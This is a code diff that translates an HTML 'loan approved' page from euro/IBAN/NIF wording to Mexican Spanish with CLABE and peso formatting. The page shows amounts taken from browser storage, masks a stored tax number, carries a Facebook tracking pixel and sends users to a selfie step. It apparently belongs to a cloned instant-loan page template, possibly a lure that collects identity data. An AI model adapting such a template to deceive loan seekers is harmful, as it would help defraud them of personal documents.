@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <script>
 (function(){
@@ -118,25 +118,25 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="dot d4"></span><span class="dot d5"></span>
       <div class="hero-circle"><svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M5 12l5 5L20 7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
     </div>
-    <h1>Congratulations, <span id="firstName"><span data-msg="aprovado.t01">customer</span></span>!</h1>
-    <div class="sub">Loan approved 🎉</div>
+    <h1>Felicitaciones, <span id="firstName"><span data-msg="aprovado.t01">customer</span></span>!</h1>
+    <div class="sub">Préstamo aprobado 🎉</div>
     <div class="lead">The amount is already reserved for you.</div>
 
     <div class="libertado">
-      <div class="lab">AMOUNT RELEASED</div>
-      <div class="val" id="valorLib">€ 0,00</div>
-      <div class="way"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 21h18M5 21V10m14 11V10M3 10l9-6 9 6M9 21v-6h6v6" stroke-linecap="round" stroke-linejoin="round"/></svg>Receipt via IBAN</div>
+      <div class="lab">MONTO LIBERADO</div>
+      <div class="val" id="valorLib">$ 0.00</div>
+      <div class="way"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 21h18M5 21V10m14 11V10M3 10l9-6 9 6M9 21v-6h6v6" stroke-linecap="round" stroke-linejoin="round"/></svg>Recepción vía CLABE</div>
     </div>
 
     <div class="grid2">
       <div class="mini">
         <div class="ico"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke-linecap="round"/><path d="M14 9a2 2 0 00-2-1.5c-1.4 0-2 .9-2 1.8 0 2.5 4 1.5 4 4 0 1-1 1.8-2 1.8a2 2 0 01-2-1.5M12 6v1.5M12 16v1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <div class="lab">MONTHLY INSTALLMENT</div>
-        <div class="v" id="prestacaoMensal">€ 0,00</div>
+        <div class="lab">CUOTA MENSUAL</div>
+        <div class="v" id="prestacaoMensal">$ 0.00</div>
       </div>
       <div class="mini">
         <div class="ico"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M3 9h18M8 3v4M16 3v4" stroke-linecap="round"/></svg></div>
-        <div class="lab">INSTALLMENTS</div>
+        <div class="lab">CUOTAS</div>
         <div class="v" id="prestacoesQtd">0x</div>
       </div>
     </div>
@@ -144,13 +144,13 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
     <div class="primeira">
       <div class="ico"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
       <div class="body">
-        <div class="lab">FIRST INSTALLMENT</div>
+        <div class="lab">PRIMERA CUOTA</div>
         <div class="v" id="primeiraData">--/--/----</div>
         <div class="hint" id="primeiraHint">—</div>
       </div>
     </div>
 
-    <button class="cta" onclick="location.href='selfie.html'">Finish registration <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M5 12h14M13 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
+    <button class="cta" onclick="location.href='selfie.html'">Finalizar registro <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M5 12h14M13 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
     <div class="lock"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 018 0v3" stroke-linecap="round"/></svg>Complete your registration to access your account</div>
   </div>
 </div>
@@ -167,7 +167,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   var nif = (localStorage.getItem('nif') || '').replace(/\D/g,'');
   if(nif.length>=9) document.getElementById('userNif').textContent = nif.slice(0,3)+' *** *'+nif.slice(7,9);
 
-  var fmtEUR = function(n){ return '€ ' + (+n).toLocaleString('de-DE',{minimumFractionDigits:2,maximumFractionDigits:2}); };
+  var fmtEUR = function(n){ return '$ ' + (+n).toLocaleString('es-MX',{minimumFractionDigits:2,maximumFractionDigits:2}); };
   var valor = +(localStorage.getItem('valorEmprestimo')||0);
   var parcelas = +(localStorage.getItem('parcelas')||0);
   var valorParcela = +(localStorage.getItem('valorParcela')||0);
